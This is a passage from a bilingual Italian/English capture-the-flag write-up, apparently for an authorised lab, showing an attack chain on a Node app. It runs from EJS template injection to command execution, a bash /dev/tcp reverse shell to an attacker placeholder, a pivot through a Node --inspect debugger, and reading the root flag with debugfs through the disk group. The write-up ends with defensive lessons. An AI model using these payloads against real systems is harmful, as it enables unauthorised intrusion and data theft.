+<pre><span class="neutral">curl -s -X POST http://&lt;target&gt;/staff/preview \</span>
+<span class="neutral">  -H "Cookie: connect.sid=&lt;cookie&gt;" \</span>
+<span class="neutral">  --data-urlencode 'template=&lt;%= 7*7 %&gt;'</span>
+<span class="comment"># 49    &lt;- the server computes, it doesn't print</span></pre>
+</div></div>
+    <p data-it="&lt;code&gt;49&lt;/code&gt;, non &lt;code&gt;7*7&lt;/code&gt;: il server esegue il mio template invece di mostrarlo. SSTI confermata. Il passo dopo è uscire dal template verso Node." data-en="&lt;code&gt;49&lt;/code&gt;, not &lt;code&gt;7*7&lt;/code&gt;: the server executes my template instead of displaying it. SSTI confirmed. Next step is escaping the template into Node."><code>49</code>, non <code>7*7</code>: il server esegue il mio template invece di mostrarlo. SSTI confermata. Il passo dopo è uscire dal template verso Node.</p>
+    <p data-it="&lt;code&gt;require&lt;/code&gt; diretto è bloccato («require is not defined»), ma EJS gira nello scope globale di Node e &lt;code&gt;global.process&lt;/code&gt; è sempre lì. Da &lt;code&gt;process.mainModule.require&lt;/code&gt; recupero &lt;code&gt;require&lt;/code&gt;, e con lui &lt;code&gt;child_process&lt;/code&gt;." data-en="Direct &lt;code&gt;require&lt;/code&gt; is blocked (&quot;require is not defined&quot;), but EJS runs in Node's global scope and &lt;code&gt;global.process&lt;/code&gt; is always there. Through &lt;code&gt;process.mainModule.require&lt;/code&gt; I recover &lt;code&gt;require&lt;/code&gt;, and with it &lt;code&gt;child_process&lt;/code&gt;."><code>require</code> diretto è bloccato («require is not defined»), ma EJS gira nello scope globale di Node e <code>global.process</code> è sempre lì. Da <code>process.mainModule.require</code> recupero <code>require</code>, e con lui <code>child_process</code>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">curl -s -X POST http://&lt;target&gt;/staff/preview \</span>
+<span class="neutral">  -H "Cookie: connect.sid=&lt;cookie&gt;" \</span>
+<span class="neutral">  --data-urlencode "template=&lt;%= global.process.mainModule.require('child_process').execSync('id').toString() %&gt;"</span>
+# <span class="ok">uid=996(poolside)</span> gid=996(poolside) groups=996(poolside)</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">curl -s -X POST http://&lt;target&gt;/staff/preview \</span>
+<span class="neutral">  -H "Cookie: connect.sid=&lt;cookie&gt;" \</span>
+<span class="neutral">  --data-urlencode "template=&lt;%= global.process.mainModule.require('child_process').execSync('id').toString() %&gt;"</span>
+# <span class="ok">uid=996(poolside)</span> gid=996(poolside) groups=996(poolside)</pre>
+</div></div>
+    <p data-it="RCE come &lt;code&gt;poolside&lt;/code&gt;. Da qui una shell è una formalità: metto un listener e cambio &lt;code&gt;id&lt;/code&gt; con una reverse shell." data-en="RCE as &lt;code&gt;poolside&lt;/code&gt;. From here a shell is a formality: I set up a listener and swap &lt;code&gt;id&lt;/code&gt; for a reverse shell.">RCE come <code>poolside</code>. Da qui una shell è una formalità: metto un listener e cambio <code>id</code> con una reverse shell.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># sul mio box</span>
+<span class="neutral">nc -lvnp 4444</span>
+<span class="neutral"></span>
+<span class="comment"># stesso /staff/preview, payload diverso</span>
+<span class="neutral">&lt;%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1'").toString() %&gt;</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># on my box</span>
+<span class="neutral">nc -lvnp 4444</span>
+<span class="neutral"></span>
+<span class="comment"># same /staff/preview, different payload</span>
+<span class="neutral">&lt;%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1'").toString() %&gt;</span></pre>
+</div></div>
+    <p data-it="Connessione in arrivo: shell come &lt;code&gt;poolside&lt;/code&gt;. La user flag è a portata di &lt;code&gt;cat&lt;/code&gt;." data-en="Connection back: a shell as &lt;code&gt;poolside&lt;/code&gt;. The user flag is a &lt;code&gt;cat&lt;/code&gt; away.">Connessione in arrivo: shell come <code>poolside</code>. La user flag è a portata di <code>cat</code>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">find / -name user.txt 2&gt;/dev/null</span>
+<span class="neutral">cat /home/poolside/user.txt</span>
+# <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">find / -name user.txt 2&gt;/dev/null</span>
+<span class="neutral">cat /home/poolside/user.txt</span>
+# <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
+  <p data-it="Bloccare &lt;code&gt;require&lt;/code&gt; non è una sandbox. Finché il template vede &lt;code&gt;global&lt;/code&gt; (o &lt;code&gt;this&lt;/code&gt;, o &lt;code&gt;constructor&lt;/code&gt;) c'è sempre una via verso &lt;code&gt;process&lt;/code&gt;. Sandboxare template utente è una guerra che di solito si perde: meglio non farglieli scrivere." data-en="Blocking &lt;code&gt;require&lt;/code&gt; is not a sandbox. As long as the template can see &lt;code&gt;global&lt;/code&gt; (or &lt;code&gt;this&lt;/code&gt;, or &lt;code&gt;constructor&lt;/code&gt;) there's always a path to &lt;code&gt;process&lt;/code&gt;. Sandboxing user templates is a war you usually lose: better not to let users write them at all.">Bloccare <code>require</code> non è una sandbox. Finché il template vede <code>global</code> (o <code>this</code>, o <code>constructor</code>) c'è sempre una via verso <code>process</code>. Sandboxare template utente è una guerra che di solito si perde: meglio non farglieli scrivere.</p>
+</div>
+
+    <h2 data-it="[04] Da poolside a root: Node --inspect e gruppo disk" data-en="[04] From poolside to root: Node --inspect and the disk group" id='root'>[04] Da poolside a root: Node --inspect e gruppo disk</h2>
+    <p data-it="&lt;code&gt;sudo -l&lt;/code&gt; vuole una password che non ho: vicolo cieco. Allora guardo cosa gira sulla macchina, ed ecco l'errore di qualcun altro." data-en="&lt;code&gt;sudo -l&lt;/code&gt; wants a password I don't have: dead end. So I look at what's running on the box, and there it is, someone else's mistake."><code>sudo -l</code> vuole una password che non ho: vicolo cieco. Allora guardo cosa gira sulla macchina, ed ecco l'errore di qualcun altro.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">sudo -l                      # chiede una password: stop</span>
+<span class="neutral">ps aux | grep -i node</span>
+# pipelin+ ... /usr/bin/node <span class="danger">--inspect=127.0.0.1:9229</span> processor.js</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">sudo -l                      # asks for a password: stop</span>
+<span class="neutral">ps aux | grep -i node</span>
+# pipelin+ ... /usr/bin/node <span class="danger">--inspect=127.0.0.1:9229</span> processor.js</pre>
+</div></div>
+    <p data-it="&lt;code&gt;--inspect&lt;/code&gt; apre il Chrome DevTools Protocol: chiunque raggiunga quella porta può eseguire JavaScript arbitrario &lt;em&gt;dentro&lt;/em&gt; quel processo, &lt;code&gt;require('child_process')&lt;/code&gt; incluso. È legata a &lt;code&gt;127.0.0.1&lt;/code&gt;, ma una shell sul box ce l'ho già: localhost non è un confine di sicurezza." data-en="&lt;code&gt;--inspect&lt;/code&gt; opens the Chrome DevTools Protocol: anyone who can reach that port can run arbitrary JavaScript &lt;em&gt;inside&lt;/em&gt; that process, &lt;code&gt;require('child_process')&lt;/code&gt; included. It's bound to &lt;code&gt;127.0.0.1&lt;/code&gt;, but I already have a shell on the box: localhost is not a security boundary."><code>--inspect</code> apre il Chrome DevTools Protocol: chiunque raggiunga quella porta può eseguire JavaScript arbitrario <em>dentro</em> quel processo, <code>require('child_process')</code> incluso. È legata a <code>127.0.0.1</code>, ma una shell sul box ce l'ho già: localhost non è un confine di sicurezza.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">curl -s http://127.0.0.1:9229/json/list</span>
+<span class="comment"># "webSocketDebuggerUrl": "ws://127.0.0.1:9229/&lt;uuid&gt;"</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">curl -s http://127.0.0.1:9229/json/list</span>
+<span class="comment"># "webSocketDebuggerUrl": "ws://127.0.0.1:9229/&lt;uuid&gt;"</span></pre>
+</div></div>
+    <p data-it="Scrivo un piccolo client WebSocket in Node che apre quella URL e invia un comando &lt;code&gt;Runtime.evaluate&lt;/code&gt;. È solo protocollo: un handshake e un JSON. Il debugger esegue nel contesto di &lt;code&gt;pipelinesvc&lt;/code&gt;." data-en="I write a small Node WebSocket client that opens that URL and sends a &lt;code&gt;Runtime.evaluate&lt;/code&gt; command. It's just protocol: a handshake and some JSON. The debugger runs in the context of &lt;code&gt;pipelinesvc&lt;/code&gt;.">Scrivo un piccolo client WebSocket in Node che apre quella URL e invia un comando <code>Runtime.evaluate</code>. È solo protocollo: un handshake e un JSON. Il debugger esegue nel contesto di <code>pipelinesvc</code>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># client CDP minimale in /tmp/cdp.js: WebSocket -&gt; Runtime.evaluate -&gt; execSync</span>
+<span class="neutral">node /tmp/cdp.js "id"</span>
+# <span class="ok">uid=995(pipelinesvc)</span> gid=995(pipelinesvc) groups=995(pipelinesvc),<span class="warn">6(disk)</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># minimal CDP client in /tmp/cdp.js: WebSocket -&gt; Runtime.evaluate -&gt; execSync</span>
+<span class="neutral">node /tmp/cdp.js "id"</span>
+# <span class="ok">uid=995(pipelinesvc)</span> gid=995(pipelinesvc) groups=995(pipelinesvc),<span class="warn">6(disk)</span></pre>
+</div></div>
+    <p data-it="Pivot da &lt;code&gt;poolside&lt;/code&gt; a &lt;code&gt;pipelinesvc&lt;/code&gt; senza toccarne la password. E &lt;code&gt;pipelinesvc&lt;/code&gt; è nel gruppo &lt;code&gt;disk&lt;/code&gt;: qui la partita è già decisa." data-en="Pivot from &lt;code&gt;poolside&lt;/code&gt; to &lt;code&gt;pipelinesvc&lt;/code&gt; without touching its password. And &lt;code&gt;pipelinesvc&lt;/code&gt; is in the &lt;code&gt;disk&lt;/code&gt; group: at this point the game is already decided.">Pivot da <code>poolside</code> a <code>pipelinesvc</code> senza toccarne la password. E <code>pipelinesvc</code> è nel gruppo <code>disk</code>: qui la partita è già decisa.</p>
+    <p data-it="Il gruppo &lt;code&gt;disk&lt;/code&gt; dà lettura sui device a blocchi grezzi, e questo scavalca del tutto i permessi del filesystem: leggo i &lt;em&gt;byte del disco&lt;/em&gt;, non i file. Non serve essere root, basta &lt;code&gt;debugfs&lt;/code&gt; sul device giusto." data-en="The &lt;code&gt;disk&lt;/code&gt; group grants read access to raw block devices, and that bypasses filesystem permissions entirely: I read the &lt;em&gt;bytes of the disk&lt;/em&gt;, not the files. No need to be root, just &lt;code&gt;debugfs&lt;/code&gt; on the right device.">Il gruppo <code>disk</code> dà lettura sui device a blocchi grezzi, e questo scavalca del tutto i permessi del filesystem: leggo i <em>byte del disco</em>, non i file. Non serve essere root, basta <code>debugfs</code> sul device giusto.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">node /tmp/cdp.js "cat /proc/partitions"</span>
+<span class="comment"># ... nvme0n1p1    &lt;- partizione root</span>
+<span class="neutral"></span>
+<span class="neutral">node /tmp/cdp.js "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2&gt;&amp;1"</span>
+# <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">node /tmp/cdp.js "cat /proc/partitions"</span>
+<span class="comment"># ... nvme0n1p1    &lt;- root partition</span>
+<span class="neutral"></span>
+<span class="neutral">node /tmp/cdp.js "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2&gt;&amp;1"</span>
+# <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+    <p data-it="Root flag letta senza mai diventare root. Nota metodica: «root flag» non implica «uid=0». Qui la catena finisce con una lettura a basso livello, e chi difende dovrebbe modellare la minaccia sui &lt;em&gt;dati&lt;/em&gt;, non solo sull'utente che li tocca." data-en="Root flag read without ever becoming root. A methodical note: &quot;root flag&quot; does not imply &quot;uid=0&quot;. Here the chain ends with a low-level read, and defenders should model the threat around the &lt;em&gt;data&lt;/em&gt;, not just the user touching it.">Root flag letta senza mai diventare root. Nota metodica: «root flag» non implica «uid=0». Qui la catena finisce con una lettura a basso livello, e chi difende dovrebbe modellare la minaccia sui <em>dati</em>, non solo sull'utente che li tocca.</p>
+    <!-- policy: la flag è sempre oscurata, per scelta editoriale -->
+    <div class="callout">
+      <div class="callout-label" data-it="// flag — OSCURATA" data-en="// flag — REDACTED">// flag — OSCURATA</div>
+      <div class="code-block"><pre><span class="ok">THM{</span><span class="redaction" aria-label="flag oscurata">████████████████████</span><span class="ok">}</span></pre></div>
+      <p data-it="La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo &lt;code&gt;Enter&lt;/code&gt; lo batti tu." data-en="You won't find the flag here: the value itself teaches nothing, and half the fun is getting there. The methodology above is complete and reproducible — the last &lt;code&gt;Enter&lt;/code&gt; is yours to press.">La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo <code>Enter</code> lo batti tu.</p>
+    </div>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// lezione" data-en="// lesson">// lezione</div>
+  <p data-it="La catena si spezza a ogni anello, e ne basta uno. &lt;strong&gt;1)&lt;/strong&gt; Tipizza gli input prima del DB (&lt;code&gt;String()&lt;/code&gt; o &lt;code&gt;mongo-sanitize&lt;/code&gt;): niente operatori &lt;code&gt;$ne&lt;/code&gt;. &lt;strong&gt;2)&lt;/strong&gt; Non far scrivere template agli utenti: EJS con &lt;code&gt;global.process&lt;/code&gt; è RCE, non «personalizzazione». &lt;strong&gt;3)&lt;/strong&gt; Mai &lt;code&gt;--inspect&lt;/code&gt; in produzione, nemmeno su &lt;code&gt;localhost&lt;/code&gt;: qualsiasi foothold diventa esecuzione come l'utente del processo. &lt;strong&gt;4)&lt;/strong&gt; I gruppi contano quanto gli utenti: &lt;code&gt;disk&lt;/code&gt; è di fatto root. Difesa in profondità vuol dire che nessuno di questi, da solo, ti compromette." data-en="The chain breaks at every link, and one is enough. &lt;strong&gt;1)&lt;/strong&gt; Coerce input types before the DB (&lt;code&gt;String()&lt;/code&gt; or &lt;code&gt;mongo-sanitize&lt;/code&gt;): no &lt;code&gt;$ne&lt;/code&gt; operators. &lt;strong&gt;2)&lt;/strong&gt; Don't let users write templates: EJS with &lt;code&gt;global.process&lt;/code&gt; is RCE, not &quot;customisation&quot;. &lt;strong&gt;3)&lt;/strong&gt; Never &lt;code&gt;--inspect&lt;/code&gt; in production, not even on &lt;code&gt;localhost&lt;/code&gt;: any foothold turns into execution as the process's user. &lt;strong&gt;4)&lt;/strong&gt; Groups matter as much as users: &lt;code&gt;disk&lt;/code&gt; is effectively root. Defense in depth means none of these, alone, compromises you.">La catena si spezza a ogni anello, e ne basta uno. <strong>1)</strong> Tipizza gli input prima del DB (<code>String()</code> o <code>mongo-sanitize</code>): niente operatori <code>$ne</code>. <strong>2)</strong> Non far scrivere template agli utenti: EJS con <code>global.process</code> è RCE, non «personalizzazione». <strong>3)</strong> Mai <code>--inspect</code> in produzione, nemmeno su <code>localhost</code>: qualsiasi foothold diventa esecuzione come l'utente del processo. <strong>4)</strong> I gruppi contano quanto gli utenti: <code>disk</code> è di fatto root. Difesa in profondità vuol dire che nessuno di questi, da solo, ti compromette.</p>
+</div>
+
+  </div><!-- /article-body -->
+  </article>
+  </main>
+
+  <div class="share-wrap">
+    <span class="share-lbl" data-it="// condividi" data-en="// share">// condividi</span>
+    <div class="share-btns">
+      <a class="share-btn" href="https://x.com/intent/tweet?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fdo-not-disturb%2F&via=PaoloCostanzoit" target="_blank" rel="noopener">X / Twitter</a>
+      <a class="share-btn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fdo-not-disturb%2F" target="_blank" rel="noopener">LinkedIn</a>
+      <button class="share-btn" onclick="copyLink(this)" data-it="copia link" data-en="copy link">copia link</button>
+    </div>
+  </div>
+
+  <aside class="author-box">
+    <span class="ab-label" data-it="// L'autore" data-en="// The author">// L'autore</span>
+    <div class="ab-name">Paolo Costanzo</div>
+    <div class="ab-role" data-it="Ricercatore indipendente di sicurezza · Co-Founder &amp;amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte" data-en="Independent Security Researcher · Co-Founder &amp;amp; CEO @ CoDe RTD · Professor of Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte">Ricercatore indipendente di sicurezza · Co-Founder &amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp; AWS @ ITS ICT Piemonte</div>
+    <p class="ab-bio" data-it="Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile." data-en="Independent research on cloud security, agentic AI systems, threat intelligence, networks and authorized offensive validation. Every report states its methodology, limitations and sources, and is reproducible where possible.">Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile.</p>
+    <div class="ab-links">
+      <a class="ab-cta" data-it="Scrivimi →" data-en="Get in touch →" href="mailto:me@paolocostanzo.com">Scrivimi →</a>
+      <a href="https://www.paolocostanzo.com" target="_blank" rel="noopener noreferrer">paolocostanzo.com</a>
+      <a href="https://www.linkedin.com/in/paolocostanzoit/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+      <a href="https://github.com/paolocostanzo" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </aside>
+  <div class="article-footer">
+    <a data-it="← tutti i writeup dell'evento" data-en="← all event writeups" href="/ctf/hacker-holidays-2026/">← tutti i writeup dell'evento</a>
+    <span class="footer-copy" data-it="© 2026 NonèCostanzo — lab autorizzato, per scopi educativi" data-en="© 2026 NonèCostanzo — authorised lab, for educational purposes">© 2026 NonèCostanzo — lab autorizzato, per scopi educativi</span>
+  </div>
+  <button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" data-it="↑ top" data-en="↑ top">↑ top</button>
+  <script>
+    function setLang(lang){
+      document.querySelectorAll('[data-'+lang+']').forEach(el=>{const val=el.getAttribute('data-'+lang);
+        if(el.tagName==='META'){el.setAttribute('content',val);}else if(el.tagName==='TITLE'){document.title=val;}else{el.innerHTML=val;}});
+      document.documentElement.lang=lang;
+      document.querySelectorAll('.lang-btn').forEach(b=>{const on=b.textContent.toLowerCase()===lang;b.classList.toggle('active',on);b.setAttribute('aria-pressed',on);});
+      document.querySelectorAll('.lang-it').forEach(el=>el.style.display=lang==='en'?'none':'');
+      document.querySelectorAll('.lang-en').forEach(el=>el.style.display=lang==='en'?'block':'none');
+      localStorage.setItem('lang',lang);
+    }
+    function copyLink(btn){const en=document.documentElement.lang==='en';
+      navigator.clipboard.writeText(window.location.href).then(()=>{btn.textContent=en?'copied ✓':'copiato ✓';btn.classList.add('ok');
+      setTimeout(()=>{btn.textContent=en?'copy link':'copia link';btn.classList.remove('ok');},2000);});}
+    const s=localStorage.getItem('lang'); if(s&&s!=='it')setLang(s);
+    const bar=document.getElementById('read-bar'),bt=document.getElementById('back-top');
+    window.addEventListener('scroll',()=>{const h=document.documentElement;bar.style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100+'%';bt.classList.toggle('vis',h.scrollTop>400);},{passive:true});
+  </script>
+</body>
+</html>
